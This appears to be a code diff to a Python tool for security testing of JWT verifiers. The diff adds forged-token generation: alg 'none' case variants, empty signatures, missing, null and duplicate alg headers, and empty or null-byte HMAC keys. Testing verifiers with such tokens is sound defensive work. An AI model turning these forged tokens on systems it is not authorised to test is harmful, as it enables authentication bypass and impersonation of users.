@@ -33,6 +33,15 @@ class SecretCandidate:
     kind: str = "secret"
 
 
+# These are deliberately kept separate from the wordlist. They represent
+# verifier edge cases, not passwords an operator is expected to maintain.
+EDGE_CASE_KEYS = (
+    SecretCandidate("", "built-in:empty-key", "edge-key"),
+    SecretCandidate("\x00", "built-in:null-byte-key", "edge-key"),
+    SecretCandidate("null", "built-in:literal-null-key", "edge-key"),
+)
+
+
 @dataclass(frozen=True)
 class TokenCandidate:
     token: str
@@ -40,6 +49,8 @@ class TokenCandidate:
     header_variant: str
     payload: dict[str, Any]
     secret: SecretCandidate | None
+    attack_class: str = "weak-hmac-key"
+    label: str | None = None
 
 
 def build_payloads(
@@ -104,6 +115,12 @@ def _b64url(value: bytes) -> str:
     return base64.urlsafe_b64encode(value).rstrip(b"=").decode()
 
 
+def _compact_token(header_json: str, payload: dict[str, Any], signature: str = "") -> str:
+    header = _b64url(header_json.encode())
+    body = _b64url(json.dumps(payload, separators=(",", ":")).encode())
+    return f"{header}.{body}.{signature}"
+
+
 def encode_candidate(
     payload: dict[str, Any],
     secret: str,
@@ -132,9 +149,98 @@ def encode_candidate(
 
 
 def encode_unsigned(payload: dict[str, Any]) -> str:
-    header = _b64url(b'{"alg":"none","typ":"JWT"}')
-    body = _b64url(json.dumps(payload, separators=(",", ":")).encode())
-    return f"{header}.{body}."
+    return _compact_token('{"alg":"none","typ":"JWT"}', payload)
+
+
+def generate_algorithm_mutations(
+    payload: dict[str, Any], algorithms: tuple[str, ...]
+) -> tuple[TokenCandidate, ...]:
+    """Return parser/algorithm edge cases that do not require signing material."""
+    candidates = [
+        TokenCandidate(
+            _compact_token(f'{{"alg":"{value}","typ":"JWT"}}', payload),
+            value,
+            "alg-case-variant",
+            payload,
+            None,
+            "algorithm-manipulation",
+            f"alg-{value}",
+        )
+        for value in ("None", "NONE", "nOnE")
+    ]
+    candidates.extend(
+        TokenCandidate(
+            _compact_token(f'{{"alg":"{algorithm}","typ":"JWT"}}', payload),
+            algorithm,
+            "empty-signature",
+            payload,
+            None,
+            "algorithm-manipulation",
+            f"empty-{algorithm}-signature",
+        )
+        for algorithm in algorithms
+    )
+    for header, algorithm, variant, label in (
+        ('{"typ":"JWT"}', "<missing>", "missing-alg", "missing-algorithm"),
+        ('{"alg":null,"typ":"JWT"}', "null", "null-alg", "null-algorithm"),
+    ):
+        candidates.append(
+            TokenCandidate(
+                _compact_token(header, payload),
+                algorithm,
+                variant,
+                payload,
+                None,
+                "algorithm-manipulation",
+                label,
+            )
+        )
+    for algorithm in algorithms:
+        for header, display, variant, label in (
+            (
+                f'{{"alg":"none","alg":"{algorithm}","typ":"JWT"}}',
+                f"none/{algorithm}",
+                "duplicate-alg-first-none",
+                "duplicate-algorithm-first-none",
+            ),
+            (
+                f'{{"alg":"{algorithm}","alg":"none","typ":"JWT"}}',
+                f"{algorithm}/none",
+                "duplicate-alg-last-none",
+                "duplicate-algorithm-last-none",
+            ),
+        ):
+            candidates.append(
+                TokenCandidate(
+                    _compact_token(header, payload),
+                    display,
+                    variant,
+                    payload,
+                    None,
+                    "algorithm-manipulation",
+                    label,
+                )
+            )
+    return tuple(candidates)
+
+
+def candidate_count(
+    payload_count: int,
+    secret_count: int,
+    *,
+    algorithms: tuple[str, ...],
+    header_variants: tuple[str, ...],
+    include_unsigned: bool,
+    include_key_edge_cases: bool = False,
+    include_algorithm_mutations: bool = False,
+) -> int:
+    key_count = secret_count + (len(EDGE_CASE_KEYS) if include_key_edge_cases else 0)
+    count = payload_count * key_count * len(algorithms) * len(header_variants)
+    if include_unsigned:
+        count += payload_count
+    if include_algorithm_mutations:
+        count += payload_count * (3 * len(algorithms) + 5)
+    return count
 
 
 def generate_candidates(
@@ -144,17 +250,34 @@ def generate_candidates(
     algorithms: tuple[str, ...],
     header_variants: tuple[str, ...],
     include_unsigned: bool,
+    include_key_edge_cases: bool = False,
+    include_algorithm_mutations: bool = False,
     limit: int | None = None,
 ) -> tuple[TokenCandidate, ...]:
     candidates: list[TokenCandidate] = []
     if include_unsigned:
         for payload in payloads:
             candidates.append(
-                TokenCandidate(encode_unsigned(payload), "none", "alg-none", payload, None)
+                TokenCandidate(
+                    encode_unsigned(payload),
+                    "none",
+                    "alg-none",
+                    payload,
+                    None,
+                    "unsigned",
+                    "unsigned-token",
+                )
             )
             if limit is not None and len(candidates) >= limit:
                 return tuple(candidates)
-    for secret in secrets:
+    if include_algorithm_mutations:
+        for payload in payloads:
+            for candidate in generate_algorithm_mutations(payload, algorithms):
+                candidates.append(candidate)
+                if limit is not None and len(candidates) >= limit:
+                    return tuple(candidates)
+    all_secrets = (*EDGE_CASE_KEYS, *secrets) if include_key_edge_cases else secrets
+    for secret in all_secrets:
         for payload in payloads:
             for algorithm in algorithms:
                 for variant in header_variants:
@@ -170,6 +293,14 @@ def generate_candidates(
                             variant,
                             payload,
                             secret,
+                            "key-edge-case"
+                            if secret.kind == "edge-key"
+                            else (
+                                "algorithm-confusion"
+                                if secret.kind == "confusion-key"
+                                else "weak-hmac-key"
+                            ),
+                            secret.label,
                         )
                     )
                     if limit is not None and len(candidates) >= limit:
